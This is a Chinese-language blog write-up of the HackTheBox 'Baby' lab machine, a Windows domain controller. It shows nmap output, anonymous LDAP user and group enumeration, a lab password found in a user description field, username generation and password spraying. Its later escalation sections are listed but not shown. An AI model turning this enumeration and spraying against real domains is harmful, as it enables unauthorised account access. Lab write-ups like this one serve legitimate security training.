<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- Google Fonts -->
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/cn-fontsource-lxgw-wen-kai-screen-r/font.css">
    <link rel="stylesheet" type="text/css" href="https://fonts.font.im/css?family=Inconsolata:normal,bold">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 Nmap123456789101112131415">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox——HTB Baby Writeup">
<meta property="og:url" content="https://n0nome.github.io/2025/09/23/Baby/Baby/index.html">
<meta property="og:site_name" content="N0nome&#96;s Fucking Life">
<meta property="og:description" content="Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 Nmap123456789101112131415">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://n0nome.github.io/images/baby-4.png">
<meta property="og:image" content="https://n0nome.github.io/images/baby.png">
<meta property="og:image" content="https://n0nome.github.io/images/baby-1.png">
<meta property="og:image" content="https://n0nome.github.io/images/baby-2.png">
<meta property="og:image" content="https://n0nome.github.io/images/baby-3.png">
<meta property="article:published_time" content="2025-09-23T09:30:36.862Z">
<meta property="article:modified_time" content="2025-09-23T09:32:59.731Z">
<meta property="article:author" content="n0nome">
<meta property="article:tag" content="writeup">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://n0nome.github.io/images/baby-4.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/laojun.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/laojun.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/laojun.jpg">
        
      
    
    <!-- title -->
    <title>HackTheBox——HTB Baby Writeup</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-RXS95XH60B"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-RXS95XH60B');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
    
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
    
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li><!--
     --><!--
       --><li><a href="https://n0nome.github.io/tags/random/">random</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2025/09/21/Expressway/Expressway/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://n0nome.github.io/2025/09/23/Baby/Baby/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://n0nome.github.io/2025/09/23/Baby/Baby/&text=HackTheBox——HTB Baby Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://n0nome.github.io/2025/09/23/Baby/Baby/&title=HackTheBox——HTB Baby Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://n0nome.github.io/2025/09/23/Baby/Baby/&is_video=false&description=HackTheBox——HTB Baby Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox——HTB Baby Writeup&body=Check out this article: https://n0nome.github.io/2025/09/23/Baby/Baby/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://n0nome.github.io/2025/09/23/Baby/Baby/&title=HackTheBox——HTB Baby Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://n0nome.github.io/2025/09/23/Baby/Baby/&title=HackTheBox——HTB Baby Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://n0nome.github.io/2025/09/23/Baby/Baby/&title=HackTheBox——HTB Baby Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://n0nome.github.io/2025/09/23/Baby/Baby/&title=HackTheBox——HTB Baby Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://n0nome.github.io/2025/09/23/Baby/Baby/&name=HackTheBox——HTB Baby Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://n0nome.github.io/2025/09/23/Baby/Baby/&t=HackTheBox——HTB Baby Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>

    

    
      <!-- 如果文章被加密，初始隐藏目录 -->
      <div id="toc" style="">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enum-Info"><span class="toc-number">1.1.</span> <span class="toc-text">Enum Info</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Enum-More-Info"><span class="toc-number">1.2.</span> <span class="toc-text">Enum More Info</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-Caroline-Robinson"><span class="toc-number">2.</span> <span class="toc-text">Shell As Caroline.Robinson</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SeBackupPrivilege-Privilege-Escalation"><span class="toc-number">2.1.</span> <span class="toc-text">SeBackupPrivilege Privilege Escalation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-Administrator"><span class="toc-number">3.</span> <span class="toc-text">Shell As Administrator</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hashes"><span class="toc-number">3.1.</span> <span class="toc-text">Hashes</span></a></li></ol></li></ol>
      </div>
     
 </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        HackTheBox——HTB Baby Writeup
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">n0nome</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-09-23T09:30:36.862Z" class="dt-published" itemprop="datePublished">2025-09-23</time>
        
        (Updated: <time datetime="2025-09-23T09:32:59.731Z" class="dt-updated" itemprop="dateModified">2025-09-23</time>)
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/writeup/" rel="tag">writeup</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code><br><a data-fancybox="gallery" data-src="/images/baby-4.png" data-caption=""><img src="/images/baby-4.png"></a></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION             </span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus     </span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server <span class="keyword">time</span>: 2025-09-23 07:24:57Z)                                                                                                       </span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)                                                                           </span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127                                                            </span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127                                                            </span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0    </span><br><span class="line">636/tcp   open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-09-23T07:26:34+00:00; 0s from scanner <span class="keyword">time</span>.</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: BABY</span><br><span class="line">|   NetBIOS_Domain_Name: BABY</span><br><span class="line">|   NetBIOS_Computer_Name: BABYDC</span><br><span class="line">|   DNS_Domain_Name: baby.vl</span><br><span class="line">|   DNS_Computer_Name: BabyDC.baby.vl</span><br><span class="line">|   DNS_Tree_Name: baby.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-09-23T07:25:54+00:00</span><br><span class="line">| ssl-cert: Subject: commonName=BabyDC.baby.vl</span><br><span class="line">| Issuer: commonName=BabyDC.baby.vl</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2025-08-18T12:14:43</span><br><span class="line">| Not valid after:  2026-02-17T12:14:43</span><br><span class="line">| MD5:     0321 bf6e 5491 db70 a414 9f0b 3b10 4b00</span><br><span class="line">| SHA-1:   f1dd 7df6 4984 95af 6ca2 e50e 0fda e11a a84d cda5</span><br><span class="line">| SHA-256: 87bc 20ae b710 c86b 100a cf73 dcf3 cd44 a499 b85b bf7a 9900 be21 7f2c 4262 9e56</span><br><span class="line">| -----BEGIN CERTIFICATE-----</span><br><span class="line">| MIIC4DCCAcigAwIBAgIQcx5FdJf0qLtO4yv+5PuH2zANBgkqhkiG9w0BAQsFADAZ</span><br><span class="line">| MRcwFQYDVQQDEw5CYWJ5REMuYmFieS52bDAeFw0yNTA4MTgxMjE0NDNaFw0yNjAy</span><br><span class="line">| MTcxMjE0NDNaMBkxFzAVBgNVBAMTDkJhYnlEQy5iYWJ5LnZsMIIBIjANBgkqhkiG</span><br><span class="line">| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwc2kSFwv2JvtdgsXNK/Tiwh2yqNd22KrACou</span><br><span class="line">| hzgqCij41ZS1gTcD+tFFFo2rgQ22rg8zBz8AhvSFIdqT19HfLe+ghXZT4/e13BTT</span><br><span class="line">| ibrD814rd55wcLuoa9hxZjpU3pPN9W9SkHaF77G5a6AzB1+HjTWVtMJxClJAnpRm</span><br><span class="line">| iWnPOwvhsdNJUeNl2Npx8MtftbuHNvCZ2h5Wxzcyxjw7ZeAI6ysi5sSRtEeDvcqR</span><br><span class="line">| uHt3UjatHirs76lir5zlxm52aUdrhRCPD77RoGU5D1CcsCraKPEVUAvLbkio2JPT</span><br><span class="line">| aaYJ8E+zI8wpgDijCuEYyt/piEIq/F9aappfnOSyhDlsgzZHfQIDAQABoyQwIjAT</span><br><span class="line">| BgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQAD</span><br><span class="line">| ggEBALYrswTrxcf3pCupW/vFNUgEi2Xrh6fjtFsuerzuuCb3ODmeQqj4Pg1qBoeC</span><br><span class="line">| X+j3v33A4Ze0s2dbk512tBxi3+dNI/cl4EQyETMu4b7fqsYkeogKsg0luEJXSt+y                                                                                                                                                 </span><br><span class="line">| scC0LOFJpVoFmo4CYVISqsRQlI1qVEVtup1LSoNZNwX3lEBc6HenqG+Xigz6G/Rl </span><br><span class="line">| jzWfNDsvU5qzd1B3FJALwq/peYS6H7DFwMgpiBtQCdcGAwj8Po/vfSQHMwWY4cd0         </span><br><span class="line">| D3ayH/t6JCPt1DCusE1YjM3Hu6X7AjJiIW5QjVN83+90jV2D+jeYrUv5W8UmVM1r                                                                                                                                                 </span><br><span class="line">| FkmiutEESB5awZaenoWT83gDZ1Q=                                                                           </span><br><span class="line">|_-----END CERTIFICATE-----                                                                              </span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found                      </span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                                                                        </span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC      </span><br><span class="line">49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">50003/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">63291/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">63292/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">63301/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">63305/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line">                                                    </span><br><span class="line">Host script results:           </span><br><span class="line">|_clock-skew: mean: 0s, deviation: 0s, median: 0s</span><br><span class="line">| smb2-time:                                  </span><br><span class="line">|   <span class="built_in">date</span>: 2025-09-23T07:25:55      </span><br><span class="line">|_  start_date: N/A   </span><br><span class="line">| smb2-security-mode:  </span><br><span class="line">|   3.1.1:                                    </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| p2p-conficker:                       </span><br><span class="line">|   Checking <span class="keyword">for</span> Conficker.C or higher...         </span><br><span class="line">|   Check 1 (port 61053/tcp): CLEAN (Timeout)                                                            </span><br><span class="line">|   Check 2 (port 35317/tcp): CLEAN (Timeout)                                                            </span><br><span class="line">|   Check 3 (port 48509/udp): CLEAN (Timeout)</span><br><span class="line">|   Check 4 (port 44270/udp): CLEAN (Timeout)                                                            </span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked  </span><br></pre></td></tr></table></figure>

<p>老样子，先加hosts</p>
<h3 id="Enum-Info"><a href="#Enum-Info" class="headerlink" title="Enum Info"></a>Enum Info</h3><p>smb没有枚举出来东西</p>
<p><a data-fancybox="gallery" data-src="/images/baby.png" data-caption=""><img src="/images/baby.png"></a></p>
<p>ldap倒是有点东西</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ nxc ldap <span class="variable">$IP</span> -u <span class="string">&#x27;&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --<span class="built_in">users</span></span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)</span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           [+] baby.vl\: </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           [*] Enumerated 9 domain <span class="built_in">users</span>: baby.vl</span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           -Username-                    -Last PW Set-       -BadPW-  -Description-                                               </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           Guest                         &lt;never&gt;             0        Built-<span class="keyword">in</span> account <span class="keyword">for</span> guest access to the computer/domain    </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           Jacqueline.Barnett            2021-11-21 23:11:03 0                                                                    </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           Ashley.Webb                   2021-11-21 23:11:03 0                                                                    </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           Hugh.George                   2021-11-21 23:11:03 0                                                                    </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           Leonard.Dyer                  2021-11-21 23:11:03 0                                                                    </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           Connor.Wilkinson              2021-11-21 23:11:08 0                                                                    </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           Joseph.Hughes                 2021-11-21 23:11:08 0                                                                    </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           Kerry.Wilson                  2021-11-21 23:11:08 0                                                                    </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           Teresa.Bell                   2021-11-21 23:14:37 0        Set initial password to BabyStart123!                  </span><br></pre></td></tr></table></figure>

<blockquote>
<p>设置初始密码为<code>BabyStart123!</code></p>
</blockquote>
<p>试一下，先根据已有的用户名生成一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ python3 UsernameGenerator.py user.list user.txt                                                                                                                                                                  </span><br><span class="line">UsernameGenerator.py - Simple username generator based on a list of name and surname                                                                                                                               </span><br><span class="line">------------------------------------------------------                                                                                                                                                             </span><br><span class="line">Input file: user.list                                                                                                                                                                                              </span><br><span class="line">Output file: user.txt                                                                                                                                                                                              </span><br><span class="line">------------------------------------------------------                                                                                                                                                             </span><br><span class="line">Usernames written to output file user.txt</span><br><span class="line">Number of <span class="built_in">users</span> created: 416</span><br><span class="line">------------------------------------------------------</span><br><span class="line"><span class="comment"># 这个脚本要求中间是空格</span></span><br></pre></td></tr></table></figure>

<p>喷射一下<br>然后就会得到一篇红色感叹号，再枚举一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ nxc ldap <span class="variable">$IP</span> -u <span class="string">&#x27;&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --<span class="built_in">groups</span>                                                                                                                                                                            1 ↵ </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)                                                                                             </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           [+] baby.vl\:                                                                                                                                                  </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           Domain Computers                         membercount: 0                                                                                                        </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           Cert Publishers                          membercount: 0                                                                                                        </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           Domain Users                             membercount: 0                                                                                                        </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           Domain Guests                            membercount: 0                                                                                                        </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           Group Policy Creator Owners              membercount: 1                                                                                                        </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           RAS and IAS Servers                      membercount: 0                                                                                                        </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           Allowed RODC Password Replication Group  membercount: 0                                                                                                        </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           Denied RODC Password Replication Group   membercount: 8                                                                                                        </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           Enterprise Read-only Domain Controllers  membercount: 0                                                                                                        </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           Cloneable Domain Controllers             membercount: 0                                                                                                        </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           Protected Users                          membercount: 0                                                                                                        </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           DnsAdmins                                membercount: 0                                                                                                        </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           DnsUpdateProxy                           membercount: 0                                                                                                        </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           dev                                      membercount: 5                                                                                                        </span><br><span class="line">LDAP        10.129.188.67   389    BABYDC           it                                       membercount: 5            </span><br></pre></td></tr></table></figure>

<h3 id="Enum-More-Info"><a href="#Enum-More-Info" class="headerlink" title="Enum More Info"></a>Enum More Info</h3><p>感觉是没有枚举干净，ldapsearch上一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">$ ldapsearch -H <span class="string">&quot;ldap://<span class="variable">$IP</span>&quot;</span> -x -s base                                                                  </span><br><span class="line"><span class="comment"># extended LDIF                                                                                          </span></span><br><span class="line"><span class="comment">#                                                                                                        </span></span><br><span class="line"><span class="comment"># LDAPv3                                                                                                 </span></span><br><span class="line"><span class="comment"># base &lt;&gt; (default) with scope baseObject                                                                </span></span><br><span class="line"><span class="comment"># filter: (objectclass=*)                                                                                </span></span><br><span class="line"><span class="comment"># requesting: ALL                                                                                        </span></span><br><span class="line"><span class="comment">#                                   </span></span><br><span class="line"><span class="comment">#                                                                                                        </span></span><br><span class="line">dn:                                                                                                      </span><br><span class="line">domainFunctionality: 7                                                                                   </span><br><span class="line">forestFunctionality: 7                                                                                   </span><br><span class="line">domainControllerFunctionality: 7                                                                         </span><br><span class="line">rootDomainNamingContext: DC=baby,DC=vl                                                                   </span><br><span class="line">ldapServiceName: baby.vl:babydc<span class="variable">$@BABY</span>.VL                                                                 </span><br><span class="line">isGlobalCatalogReady: TRUE                                                                               </span><br><span class="line">supportedSASLMechanisms: GSSAPI                                                                          </span><br><span class="line">supportedSASLMechanisms: GSS-SPNEGO                                                                      </span><br><span class="line">supportedSASLMechanisms: EXTERNAL                                                                        </span><br><span class="line">supportedSASLMechanisms: DIGEST-MD5      </span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=baby,DC=vl</span><br><span class="line">serverName: CN=BABYDC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Config</span><br><span class="line"> uration,DC=baby,DC=vl</span><br><span class="line">schemaNamingContext: CN=Schema,CN=Configuration,DC=baby,DC=vl</span><br><span class="line">namingContexts: DC=baby,DC=vl</span><br><span class="line">namingContexts: CN=Configuration,DC=baby,DC=vl</span><br><span class="line">namingContexts: CN=Schema,CN=Configuration,DC=baby,DC=vl</span><br><span class="line">namingContexts: DC=DomainDnsZones,DC=baby,DC=vl</span><br><span class="line">namingContexts: DC=ForestDnsZones,DC=baby,DC=vl</span><br><span class="line">isSynchronized: TRUE</span><br><span class="line">highestCommittedUSN: 118887</span><br><span class="line">dsServiceName: CN=NTDS Settings,CN=BABYDC,CN=Servers,CN=Default-First-Site-Nam</span><br><span class="line"> e,CN=Sites,CN=Configuration,DC=baby,DC=vl</span><br><span class="line">dnsHostName: BabyDC.baby.vl</span><br><span class="line">defaultNamingContext: DC=baby,DC=vl</span><br><span class="line">currentTime: 20250923080537.0Z</span><br><span class="line">configurationNamingContext: CN=Configuration,DC=baby,DC=vl</span><br><span class="line"></span><br><span class="line"><span class="comment"># search result</span></span><br><span class="line">search: 2</span><br><span class="line">result: 0 Success</span><br><span class="line"></span><br><span class="line"><span class="comment"># numResponses: 2</span></span><br><span class="line"><span class="comment"># numEntries: 1</span></span><br></pre></td></tr></table></figure>

<p>继续</p>
<p><a data-fancybox="gallery" data-src="/images/baby-1.png" data-caption=""><img src="/images/baby-1.png"></a></p>
<p>这个找到了我们枚举出来的那个密码</p>
<p>整理一下拿到用户名列表，如果筛选<code>userPrincipalName:</code>的话就是我们上面用nxc枚举出来的，我们可以看到还有<code>dev</code>、<code>it</code>其他两个群组，所以可以枚举一下<code>distinguishedName:</code></p>
